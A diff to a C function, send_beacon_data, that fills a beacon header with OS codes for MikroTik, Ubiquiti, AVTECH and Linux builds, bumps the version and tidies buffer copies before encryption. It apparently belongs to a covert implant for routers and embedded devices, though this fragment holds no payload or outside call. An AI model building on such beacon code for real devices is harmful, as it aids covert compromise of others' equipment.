@@ -313,9 +313,12 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	memset(temp, 0, 1024);
 
-	//MessageBox(NULL,"Let us Begin the Beacon!","OKAY",MB_OK);
 	//Populate Beacon Header
-#if defined MIKROTIK
+	bhdr.os = 0;
+#if defined AVTECH_ARM
+		bhdr.os = htons(BH_AVTECH_ARM);
+
+#elif defined MIKROTIK
 	#if defined _PPC
 		bhdr.os = htons(BH_MIKROTIK_PPC);
 	#elif defined _MIPS
@@ -326,12 +329,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		bhdr.os = htons(BH_MIKROTIK_X86);
 	#endif
 
-//#elif defined SOLARIS
-//	#if defined _X86
-//		bhdr.os = htons(BH_SOLARIS_X86);
-//	#endif
-
-#elif defined LINUX && !defined UBIQUITI
+#elif (defined LINUX) && (!defined UBIQUITI)
 	#if defined _X86
 		bhdr.os = htons(BH_LINUX_X86);
 	#elif defined _X86_64
@@ -341,12 +339,13 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 #elif defined UBIQUITI
 		bhdr.os = htons(BH_UBIQUITI_MIPS);
 
-#elif defined ARM
-	bhdr.os = htons(BH_ARM);
+#else
+	#error "ARCHITECTURE NOT DEFINED"
 #endif
 
 	//TODO: Change this number whenever the version changes.
-	bhdr.version = htons(28);
+	bhdr.version = htons(29);
+	DLX(4, printf("\tBEACON HEADER: version: %i, os: %i\n", bhdr.version, bhdr.os));
 
 	//Populate Additional Headers
 	//mac address
@@ -546,11 +545,11 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	}
 
 	//zero out buffer
-	memset(packet,0,packetSize);
+	memset(packet, 0, packetSize);
 	//copy in beacon hdr
-	memcpy(packet,&bhdr,sizeof(BEACON_HDR));
+	memcpy(packet, &bhdr, sizeof(BEACON_HDR));
 	//copy in compressed data
-	memcpy(packet+sizeof(BEACON_HDR),compressed_packet,compressedPacketSize);
+	memcpy(packet+sizeof(BEACON_HDR), compressed_packet, compressedPacketSize);
 
 	//calculate encryption buffer size
 	encrypt_size = packetSize + (8 - (packetSize % 8));
